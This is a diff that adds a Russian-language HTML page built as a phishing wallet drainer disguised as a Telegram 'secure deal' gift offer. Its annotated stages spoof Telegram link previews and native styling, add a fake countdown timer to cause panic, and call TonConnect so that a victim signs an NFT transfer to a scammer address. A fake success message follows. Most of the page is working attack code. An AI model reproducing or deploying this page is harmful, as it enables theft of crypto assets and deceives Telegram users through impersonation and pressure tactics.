@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <!-- Блокировка масштабирования, чтобы сайт ощущался как нативное приложение, а не веб-страница -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram: Защищенная Сделка</title>
+    
+    <!-- === ЭТАП 1: OPEN GRAPH (Иллюзия картинки в чате) === -->
+    <!-- Эти теги читает сервер Telegram до того, как пользователь кликнет по ссылке -->
+    <meta property="og:site_name" content="Telegram">
+    <meta property="og:title" content="Lol Pop #419653">
+    <meta property="og:description" content="ПОКАЗАТЬ ПОДАРОК">
+    <!-- Ссылка на картинку, которая отобразится в превью -->
+    <meta property="og:image" content="https://ton-nft-images.com/lollipop_419653.png">
+    
+    <!-- Подключение официальных библиотек -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
+    <style>
+        /* === ЭТАП 2: CSS-МИМИКРИЯ === */
+        /* Использование динамических переменных Telegram. 
+           Сайт автоматически станет темным, если у жертвы темная тема, и светлым, если светлая. */
+        body {
+            background-color: var(--tg-theme-bg-color, #17212b);
+            color: var(--tg-theme-text-color, #ffffff);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column; align-items: center;
+            height: 100vh; overflow: hidden;
+        }
+        .container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; text-align: center; }
+        .header-title { font-size: 20px; font-weight: 600; margin-bottom: 25px; color: var(--tg-theme-hint-color, #7f91a4); }
+        
+        .gift-card {
+            background-color: var(--tg-theme-secondary-bg-color, #242f3d);
+            border-radius: 16px; padding: 20px; margin-bottom: 24px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .gift-image { width: 140px; height: 140px; object-fit: contain; margin-bottom: 15px; }
+        .gift-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        
+        .offer-box {
+            background-color: rgba(230, 193, 59, 0.1);
+            border: 1px solid rgba(230, 193, 59, 0.3);
+            border-radius: 12px; padding: 15px; margin-bottom: 20px;
+        }
+        .offer-text { font-size: 15px; color: var(--tg-theme-text-color); margin-bottom: 5px; }
+        .price-highlight { color: #e6c13b; font-weight: 800; font-size: 22px; display: flex; align-items: center; justify-content: center; gap: 5px;}
+        
+        /* Кнопка в точности копирует системную кнопку Telegram */
+        .btn-primary {
+            background-color: var(--tg-theme-button-color, #5288c1);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none; border-radius: 12px; padding: 16px 20px;
+            font-size: 17px; font-weight: 600; width: 100%; cursor: pointer;
+        }
+        .timer { margin-top: 15px; font-size: 13px; color: #ff595a; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-title">Система безопасных сделок</div>
+        
+        <!-- Пустой каркас, который заполнится через доли секунды -->
+        <div class="gift-card">
+            <img id="item-image" class="gift-image" src="" alt="">
+            <div id="item-title" class="gift-title">Загрузка...</div>
+        </div>
+
+        <div class="offer-box">
+            <div class="offer-text">Вам предложено вознаграждение:</div>
+            <div class="price-highlight"><span id="offer-price">...</span> ⭐️</div>
+        </div>
+
+        <button id="action-btn" class="btn-primary">Подтвердить получение</button>
+        <div class="timer">Предложение истекает через: <span id="time-left">02:59</span></div>
+    </div>
+
+    <script>
+        // Сообщаем клиенту Telegram, что приложение готово, и разворачиваем его на весь экран
+        window.Telegram.WebApp.expand();
+        window.Telegram.WebApp.ready();
+
+        // === ЭТАП 3: СКРИПТ-ОФОРМИТЕЛЬ ===
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // Извлекаем параметры (в реальности скрипт парсит их из ссылки-ловушки)
+        const itemName = urlParams.get('item') || 'Уникальный Подарок';
+        const itemId = urlParams.get('id') || '000000';
+        const offerPrice = urlParams.get('price') || '0';
+        
+        // Подстановка правильной картинки по названию
+        const itemImgSrc = `https://ton-nft-images.com/${itemName.toLowerCase()}.png`;
+
+        // Моментальная инъекция данных в HTML
+        document.getElementById('item-title').innerText = `${itemName.replace('_', ' ')} #${itemId}`;
+        document.getElementById('offer-price').innerText = offerPrice;
+        document.getElementById('item-image').src = itemImgSrc;
+
+        // Искусственный таймер (создание паники)
+        let timeLeft = 179; 
+        setInterval(() => {
+            let m = Math.floor(timeLeft / 60);
+            let s = timeLeft % 60;
+            document.getElementById('time-left').innerText = `0${m}:${s < 10 ? '0' : ''}${s}`;
+            if(timeLeft > 0) timeLeft--;
+        }, 1000);
+
+        // === ЭТАП 4: СКРИПТ-КАПКАН ===
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://scammer-site.github.io/tonconnect-manifest.json'
+        });
+
+        document.getElementById('action-btn').addEventListener('click', async () => {
+            // Реквизиты для кражи
+            const scammerAddress = "EQD_Scammer_Address_Here";
+            const nftAddress = "EQD_NFT_Contract_Address"; // Адрес контракта конкретного леденца
+            
+            // Бинарный код команды блокчейну (Опкод 0x5fcc3d14 - Передача NFT)
+            const transferPayload = "te6cckEBAQEAAgAAAA=="; 
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут на подтверждение
+                messages: [
+                    {
+                        address: nftAddress, // Обращаемся к смарт-контракту подарка
+                        amount: "50000000", // Оплата газа сети (списывается у жертвы)
+                        payload: transferPayload
+                    }
+                ]
+            };
+
+            try {
+                // Вызов системного окна FaceID / Пароля от кошелька
+                await tonConnectUI.sendTransaction(transaction);
+                
+                // Если транзакция подписана, успокаиваем жертву
+                document.body.innerHTML = '<h2 style="margin-top:100px; color:var(--tg-theme-text-color);">Сделка успешно завершена!<br>Звезды будут зачислены в течение 5 минут.</h2>';
+            } catch (e) {
+                // Если жертва отменила подпись, ничего не делаем, ждем следующей попытки
+                console.error("Отказ подписи", e);
+            }
+        });
+    </script>
+</body>
+</html>
